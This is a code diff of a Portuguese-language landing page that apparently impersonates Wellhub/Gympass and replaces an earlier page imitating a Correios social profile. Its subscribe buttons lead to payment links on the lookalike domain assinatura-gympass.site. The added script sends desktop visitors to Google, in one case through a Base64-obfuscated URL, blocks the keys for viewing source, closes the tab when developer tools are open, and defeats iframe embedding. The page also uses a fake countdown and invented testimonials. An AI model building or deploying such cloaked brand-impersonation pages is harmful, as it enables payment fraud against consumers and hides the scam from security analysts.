-                <img alt="Correios delivery van parked on the street" class="w-full aspect-square object-cover" src="images/post5.png">
-                <img alt="Correios employee using a handheld device" class="w-full aspect-square object-cover" src="images/post6.png">
-                <img alt="Correios office with customers" class="w-full aspect-square object-cover" src="images/post7.png">
-                <img alt="Correios package being scanned" class="w-full aspect-square object-cover" src="images/post8.png">
-                <img alt="Correios employee at a counter" class="w-full aspect-square object-cover" src="images/post9.png">
-            </div>
-            <div class="flex flex-col items-center justify-center mt-4 mb-20">
-                <p class="text-gray-500 text-sm mb-2">Carregando publicações antigas</p>
-                <div class="loading-spinner"></div>
-            </div>
+    <!-- Seção Academias Parceiras -->
+    <section class="section-academias">
+      <h2>Sinta-se bem com as melhores academias</h2>
+      <p>Acesso ilimitado a mais de 28 mil parceiros em todo o país.</p>
+      
+      <div class="academias-grid">
+        <div class="academia-card" tabindex="0">
+          <img src="images/Yg5o76vQBPDY.png" alt="Cia Athletica" loading="lazy">
+          <p>Cia Athletica</p>
         </div>
-        <nav class="fixed bottom-0 left-0 right-0 bg-white">
-            <div class="flex justify-around py-4 items-center">
-                <div class="nav-icon">
-                    <img src="images/IMG-7308-2.jpg" alt="Home icon" class="w-6 h-6 object-cover">
-                </div>
-                <div class="nav-icon">
-                    <i class="fas fa-search search-icon"></i>
-                </div>
-                <div class="plus-icon-container">
-                    <span class="plus-icon">+</span>
-                </div>
-                <div class="nav-icon">
-                    <img src="images/IMG-7307.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
-                </div>
-                <div class="nav-icon">
-                    <img alt="Correios logo with yellow and blue arrows on a green background" class="w-6 h-6 rounded-full" src="images/logo.png">
-                </div>
-            </div>
-        </nav>
-    </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/tGzTsGd5ZtA3.png" alt="Bodytech" loading="lazy">
+          <p>Bodytech</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/GhOWIzOm1obY.png" alt="Academia Gaviões" loading="lazy">
+          <p>Academia Gaviões</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/zaQJCeLpN0kt.png" alt="Pure Pilates" loading="lazy">
+          <p>Pure Pilates</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/exrOQhhzXBjt.png" alt="Spin'n Soul" loading="lazy">
+          <p>Spin'n Soul</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/6p7Inz6xxfZN.png" alt="Engenharia do Corpo" loading="lazy">
+          <p>Engenharia do Corpo</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/A42rzlUcY85G.png" alt="Formula" loading="lazy">
+          <p>Formula</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/U2NGIQIebGmY.png" alt="Cross Experience" loading="lazy">
+          <p>Cross Experience</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/abL1JN78JTyv.png" alt="Tecfit" loading="lazy">
+          <p>Tecfit</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/wFF7L6d87hx2.png" alt="Selfit" loading="lazy">
+          <p>Selfit</p>
+        </div>
+        <div class="academia-card" tabindex="0">
+          <img src="images/KbgD2yJYrcKR.png" alt="Panobianco" loading="lazy">
+          <p>Panobianco</p>
+        </div>
+      </div>
+    
+      <!-- Categoria -->
+      <div class="categoria">
+        <span class="categoria-badge">✔️ Atividade física</span>
+      </div>
+    </section>
 
-    <div id="story-overlay">
-        <iframe id="story-content" src=""></iframe>
-    </div>
+    <!-- Seção de Destaque -->
+    <section class="section-highlight">
+      <h2>Destaques da Promoção</h2>
+      <ul class="highlight-list">
+        <li>50.000 academias parceiras</li>
+        <li>Aplicativos de saúde integrados</li>
+        <li>Suporte dedicado 24/7</li>
+        <li>Recursos exclusivos de bem-estar</li>
+      </ul>
+    </section>
 
+    <!-- Seção Planos Populares -->
+    <section class="section-planos" id="planos">
+      <!-- Marcador de Período -->
+      <div class="periodo-selector" role="tablist" aria-label="Seleção de Período de Plano">
+        <button id="btn-anual" class="active" role="tab" aria-selected="true" aria-controls="planos-grid">Plano Mensal (1 Mês)</button>
+        <button id="btn-semestral" role="tab" aria-selected="false" aria-controls="planos-grid">Plano Semestral (6 Meses)</button>
+      </div>
+    
+      <!-- Título -->
+      <h2>Conheça nossos planos mais populares</h2>
+      <p>Exercite-se onde e quando quiser, com os melhores parceiros!</p>
+    
+      <!-- Tabela de Preços -->
+      <div class="planos-container" style="position: relative;">
+        <!-- Botões de Navegação do Carrossel (apenas para telas menores) -->
+        <div class="carousel-nav">
+          <button id="prev-btn" aria-label="Plano Anterior" style="display: block;"><</button>
+          <button id="next-btn" aria-label="Próximo Plano" style="display: block;">></button>
+        </div>
+
+        <div class="planos-grid" id="planos-grid" role="tabpanel" aria-labelledby="btn-anual">
+          <!-- Starter -->
+          <div class="plano-card starter" tabindex="0">
+            <h3>Starter</h3>
+            <p>Descubra academias e atividades para sua saúde.</p>
+            <p class="preco" id="starter-preco">R$ 29,90 / mês</p>
+            <a href="https://pay.assinatura-gympass.site/521rZJ29XywZeaX" class="btn-assine" role="button" id="starter-link">Assine Agora</a>
+            <ul>
+              <li>2.600+ academias</li>
+              <li>42 Apps de bem-estar</li>
+              <li>Treinos online ao vivo</li>
+            </ul>
+            <p class="detalhe">Aceita academias com mensalidades até R$99/mês.</p>
+          </div>
+      
+          <!-- Basic (Plano Recomendado) -->
+          <div class="plano-card basic" tabindex="0">
+            <span class="badge-recomendado">Plano Mais Escolhido</span>
+            <h3>Basic</h3>
+            <p>Tenha mais variedade em sua rotina.</p>
+            <p class="preco" id="basic-preco">R$ 49,90 / mês</p>
+            <a href="https://pay.assinatura-gympass.site/YEwR3A9aK1d3dKy" class="btn-assine" role="button" id="basic-link">Assine Agora</a>
+            <ul>
+              <li>9.100+ academias</li>
+              <li>46 Apps de bem-estar</li>
+              <li>Treinos online ao vivo</li>
+              <li>2x/mês personal training</li>
+            </ul>
+            <p class="detalhe">Aceita academias com mensalidades até R$199/mês.</p>
+          </div>
+      
+          <!-- Silver -->
+          <div class="plano-card silver" tabindex="0">
+            <h3>Silver</h3>
+            <p>Mais opções de atividades físicas e bem-estar.</p>
+            <p class="preco" id="silver-preco">R$ 119,90 / mês</p>
+            <a href="https://pay.assinatura-gympass.site/a9ArZMrn5WQG7xj" class="btn-assine" role="button" id="silver-link">Assine Agora</a>
+            <ul>
+              <li>19.900+ academias</li>
+              <li>54 Apps de bem-estar</li>
+              <li>Treinos online ao vivo</li>
+              <li>4x/mês personal training</li>
+            </ul>
+            <p class="detalhe">Aceita academias com mensalidades até R$299/mês.</p>
+          </div>
+      
+          <!-- Gold -->
+          <div class="plano-card gold" tabindex="0">
+            <h3>Gold</h3>
+            <p>Opções premium na rede.</p>
+            <p class="preco" id="gold-preco">R$ 249,90 / ano</p>
+            <a href="https://pay.assinatura-gympass.site/65XDZB7kvOlGVJw" class="btn-assine" role="button" id="gold-link">Assine Agora</a>
+            <ul>
+              <li>25.500+ academias</li>
+              <li>54 Apps de bem-estar</li>
+              <li>Treinos online ao vivo</li>
+              <li>4x/mês personal training</li>
+            </ul>
+            <p class="detalhe">Aceita academias com mensalidades até R$499/mês.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq">
+      <h2>Perguntas Frequentes</h2>
+      <details>
+        <summary>Como saber se minha academia está inclusa?</summary>
+        <p>Confira o valor da mensalidade da sua academia e compare com o limite aceito pelo plano.</p>
+      </details>
+      <details>
+        <summary>E se a academia tiver uma mensalidade maior?</summary>
+        <p>Você pode fazer um upgrade para um plano que aceite mensalidades maiores.</p>
+      </details>
+      <details>
+        <summary>Como funciona o desconto?</summary>
+        <p>Aplica-se automaticamente na compra de planos anuais ou semestrais.</p>
+      </details>
+      <details>
+        <summary>Quais os benefícios do plano?</summary>
+        <p>Acesso total às academias, apps e treinos online.</p>
+      </details>
+    </section>
+  
+    <!-- Seção "Você vai amar nossa rede" -->
+    <section class="section-amar-rede">
+      <h2>Você vai amar nossa rede</h2>
+      <div class="stats">
+        <div class="stat">29.000+ academias e estúdios</div>
+        <div class="stat">2.200+ personal trainers</div>
+        <div class="stat">6.000+ aulas e apps</div>
+      </div>
+      <div class="comentarios">
+        <div class="comentario">
+          <p class="nome">Mitchell M.</p>
+          <p>"Com Wellhub, economizo R$ 100 por mês em academia e ainda tenho acesso a muito mais opções."</p>
+        </div>
+        <div class="comentario">
+          <p class="nome">Lindsey E.</p>
+          <p>"Eu adoro o Wellhub. É muito fácil agendar aulas pelo app."</p>
+        </div>
+        <div class="comentario">
+          <p class="nome">Michael M.</p>
+          <p>"Com a ajuda do Wellhub, meditar agora faz parte da minha rotina."</p>
+        </div>
+      </div>
+    </section>
+  
+    <!-- Rodapé -->
+    <footer>
+      <div class="container">
+        <div class="urgencia-footer">
+          <p>Não deixe para depois – a promoção termina em 7 de janeiro. Aproveite agora!</p>
+        </div>
+        <p>© 2025 WellHub. Todos os direitos reservados.</p>
+      </div>
+    </footer>
+
+    <!-- Scripts Otimizados -->
     <script>
-        setTimeout(function() {
-            document.getElementById('loading-screen').style.display = 'none';
-            document.getElementById('content').classList.remove('hidden');
-            document.getElementById('popup').style.display = 'block';
-        }, 3000);
+      document.addEventListener('DOMContentLoaded', () => {
+        // Contador de Tempo
+        const fim = new Date('2025-01-07T23:59:59').getTime();
 
-        const followButton = document.getElementById('followButton');
-        const buttonText = document.getElementById('buttonText');
-        const loadingIcon = document.querySelector('.loading-icon');
-        const downArrow = document.getElementById('downArrow');
+        const countdownTimer = document.getElementById('countdown-timer');
 
-        followButton.addEventListener('click', function() {
-            buttonText.style.display = 'none';
-            loadingIcon.style.display = 'block';
-            
-            setTimeout(function() {
-                loadingIcon.style.display = 'none';
-                buttonText.style.display = 'inline';
-                buttonText.textContent = 'Seguindo';
-                downArrow.classList.remove('hidden');
-                
-                followButton.classList.remove('custom-blue');
-                followButton.style.backgroundColor = '#F3F4F6'; 
-                followButton.classList.add('text-black');
-                downArrow.setAttribute('fill', 'currentColor');
-            }, 2000);
+        const intervalo = setInterval(() => {
+          const agora = new Date().getTime();
+          const diferenca = fim - agora;
+
+          if (diferenca <= 0) {
+            clearInterval(intervalo);
+            countdownTimer.innerText = "Promoção Expirada!";
+            return;
+          }
+
+          const dias = Math.floor(diferenca / (1000 * 60 * 60 * 24));
+          const horas = Math.floor((diferenca % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+          const minutos = Math.floor((diferenca % (1000 * 60 * 60)) / (1000 * 60));
+          const segundos = Math.floor((diferenca % (1000 * 60)) / 1000);
+
+          countdownTimer.innerText = `${dias} dias, ${horas} horas, ${minutos} minutos e ${segundos} segundos`;
+        }, 1000);
+
+        // Alternância de Preços e Links
+        const precosAnual = {
+          starter: 'R$ 269,90 / ano',
+          basic: 'R$ 359,90 / ano',
+          silver: 'R$ 539,90 / ano',
+          gold: 'R$ 719,90 / ano'
+        };
+      
+        const precosSemestral = {
+          starter: 'R$ 149,90 / 6 meses',
+          basic: 'R$ 224,90 / 6 meses',
+          silver: 'R$ 299,90 / 6 meses',
+          gold: 'R$ 389,90 / 6 meses'
+        };
+
+        const linksAnual = {
+          starter: 'https://pay.assinatura-gympass.site/521rZJ29XywZeaX',
+          basic: 'https://pay.assinatura-gympass.site/YEwR3A9aK1d3dKy',
+          silver: 'https://pay.assinatura-gympass.site/a9ArZMrn5WQG7xj',
+          gold: 'https://pay.assinatura-gympass.site/65XDZB7kvOlGVJw'
+        };
+
+        const linksSemestral = {
+          starter: 'https://pay.assinatura-gympass.site/nOzxZoa0VA2gJ07',
+          basic: 'https://pay.assinatura-gympass.site/1VOvGVr9E0XGD62',
+          silver: 'https://pay.assinatura-gympass.site/a6pVgdx8Da7gk7B',
+          gold: 'https://pay.assinatura-gympass.site/bz5KZbKJd2yG7dL'
+        };
+      
+        const btnAnual = document.getElementById('btn-anual');
+        const btnSemestral = document.getElementById('btn-semestral');
+        const precos = {
+          starter: document.getElementById('starter-preco'),
+          basic: document.getElementById('basic-preco'),
+          silver: document.getElementById('silver-preco'),
+          gold: document.getElementById('gold-preco')
+        };
+
+        const links = {
+          starter: document.getElementById('starter-link'),
+          basic: document.getElementById('basic-link'),
+          silver: document.getElementById('silver-link'),
+          gold: document.getElementById('gold-link')
+        };
+      
+        btnAnual.addEventListener('click', () => {
+          atualizarPrecos(precosAnual);
+          atualizarLinks(linksAnual);
+          toggleAtivo(btnAnual, btnSemestral);
         });
-
-        const messageButton = document.getElementById('messageButton');
-        messageButton.addEventListener('click', function() {
-            window.location.href = '/chat.html';
+      
+        btnSemestral.addEventListener('click', () => {
+          atualizarPrecos(precosSemestral);
+          atualizarLinks(linksSemestral);
+          toggleAtivo(btnSemestral, btnAnual);
         });
+      
+        function atualizarPrecos(precosNovo) {
+          precos.starter.innerText = precosNovo.starter;
+          precos.basic.innerText = precosNovo.basic;
+          precos.silver.innerText = precosNovo.silver;
+          precos.gold.innerText = precosNovo.gold;
+        }
 
-        const profileImage = document.getElementById('profileImage');
-        const profileImageContainer = document.getElementById('profileImageContainer');
-        const storyOverlay = document.getElementById('story-overlay');
-        const storyContent = document.getElementById('story-content');
+        function atualizarLinks(linksNovo) {
+          links.starter.href = linksNovo.starter;
+          links.basic.href = linksNovo.basic;
+          links.silver.href = linksNovo.silver;
+          links.gold.href = linksNovo.gold;
+        }
+      
+        function toggleAtivo(botaoAtivo, botaoInativo) {
+          botaoAtivo.classList.add('active');
+          botaoAtivo.setAttribute('aria-selected', 'true');
+          botaoInativo.classList.remove('active');
+          botaoInativo.setAttribute('aria-selected', 'false');
+        }
 
-        let isClicked = false;
-
-        profileImage.addEventListener('click', function() {
-            if (!isClicked) {
-                isClicked = true;
-                profileImageContainer.style.background = '#f0f0f0';
+        // Inicialização: definir links com base no período padrão (Anual)
+        atualizarLinks(linksAnual);
+      
+        // Acessibilidade para teclas de navegação nos planos
+        const planoCards = document.querySelectorAll('.plano-card');
+        planoCards.forEach(card => {
+          card.setAttribute('tabindex', '0');
+          card.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+              card.querySelector('.btn-assine').click();
             }
-
-            storyContent.src = 'story.html';
-            storyOverlay.style.display = 'block';
-            
-            setTimeout(() => {
-                storyOverlay.style.display = 'none';
-                storyContent.src = '';
-            }, 15000);
+          });
         });
+      
+        // Função de Navegação do Carrossel
+        const prevBtn = document.getElementById('prev-btn');
+        const nextBtn = document.getElementById('next-btn');
+        const planosGrid = document.getElementById('planos-grid');
+      
+        prevBtn.addEventListener('click', () => {
+          planosGrid.scrollBy({
+            left: -planosGrid.clientWidth,
+            behavior: 'smooth'
+          });
+        });
+      
+        nextBtn.addEventListener('click', () => {
+          planosGrid.scrollBy({
+            left: planosGrid.clientWidth,
+            behavior: 'smooth'
+          });
+        });
+      
+        // Ocultar Botões de Navegação se não houver mais slides
+        planosGrid.addEventListener('scroll', () => {
+          const scrollLeft = planosGrid.scrollLeft;
+          const maxScrollLeft = planosGrid.scrollWidth - planosGrid.clientWidth;
+      
+          if (scrollLeft === 0) {
+            prevBtn.style.display = 'none';
+          } else {
+            prevBtn.style.display = 'block';
+          }
+      
+          if (scrollLeft >= maxScrollLeft - 1) { // Ajuste para evitar pequenos desvios
+            nextBtn.style.display = 'none';
+          } else {
+            nextBtn.style.display = 'block';
+          }
+        });
+      
+        // Inicialização: verificar a posição do scroll
+        setTimeout(() => {
+          planosGrid.dispatchEvent(new Event('scroll'));
+        }, 100);
+      });
+      // BLOQUEIO PARA DESKTOP
+      function isDesktop() {
+        return !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      }
+      
+      if (isDesktop()) {
+        window.location.href = "https://www.google.com";
+      }
+      
+      // BLOQUEIO DE IFRAME (ANTI-CLONAGEM)
+      if (window.self !== window.top) {
+        document.body.innerHTML = ""; // Remove todo o conteúdo visível
+        window.top.location = window.self.location; // Redireciona para a URL original
+      }
+      
+      // BLOQUEIO DE DEVTOOLS
+      (function () {
+        // Previne abertura de ferramentas de desenvolvedor (F12, Ctrl+Shift+I, etc.)
+        function blockDevTools() {
+          document.addEventListener("contextmenu", (e) => e.preventDefault()); // Bloqueia clique direito
+          document.addEventListener("keydown", (e) => {
+            if (
+              e.ctrlKey &&
+              (e.key === "u" || e.key === "U" || e.key === "s" || e.key === "S") // Ctrl+U ou Ctrl+S
+            ) {
+              e.preventDefault();
+            }
+            if (
+              e.key === "F12" || // Bloqueia F12
+              (e.ctrlKey && e.shiftKey && e.key === "I") || // Ctrl+Shift+I
+              (e.ctrlKey && e.shiftKey && e.key === "J") || // Ctrl+Shift+J
+              (e.ctrlKey && e.key === "E") // Ctrl+E
+            ) {
+              e.preventDefault();
+            }
+          });
+        }
+      
+        blockDevTools();
+      
+        // Detecta DevTools abertos e fecha a página
+        setInterval(() => {
+          let startTime = performance.now();
+          debugger; // Força o DevTools a abrir, se estiver fechado
+          let endTime = performance.now();
+          if (endTime - startTime > 100) {
+            window.close(); // Fecha a aba se DevTools estiver ativo
+          }
+        }, 200);
+      })();
+      
+      // CAMUFLAGEM DE LINK (OBFUSCADO)
+      const redirLink = atob("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ=="); // Link codificado em Base64
+      if (isDesktop()) {
+        window.location.href = redirLink;
+      }
     </script>
+  </main>
+
 
 
 </body></html>
